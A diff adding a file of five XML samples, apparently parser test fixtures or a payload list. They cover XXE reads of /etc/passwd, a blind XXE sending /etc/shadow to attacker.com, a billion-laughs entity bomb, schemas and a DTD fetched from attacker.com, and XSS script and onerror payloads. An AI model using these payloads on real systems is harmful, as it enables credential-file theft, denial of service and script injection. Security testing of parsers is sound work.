@@ -1,0 +1,55 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY>
+  <!ATTLIST root id ID #REQUIRED>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root id="test">&xxe;</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///etc/shadow">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+  %eval;
+  %exfiltrate;
+]>
+<data><content/></data>
+```
+
+```xml
+<!DOCTYPE bomb [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<bomb>&lol4;</bomb>
+```
+
+```xml
+<?xml version="1.0"?>
+<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://attacker.com/schema.xsd http://attacker.com/evil.xsd">
+  <element attr1="value1" attr2="value2">
+    <nested>
+      <deep>&lt;![CDATA[unclosed cdata</deep>
+    </nested>
+  </element>
+</root>
+```
+
+```xml
+<!DOCTYPE html [
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<html>
+  <body>
+    <script>alert('xss')</script>
+    <img src="x" onerror="alert(1)"/>
+    &#xFFFE;&#xFFFF;
+  </body>
+</html>
+```
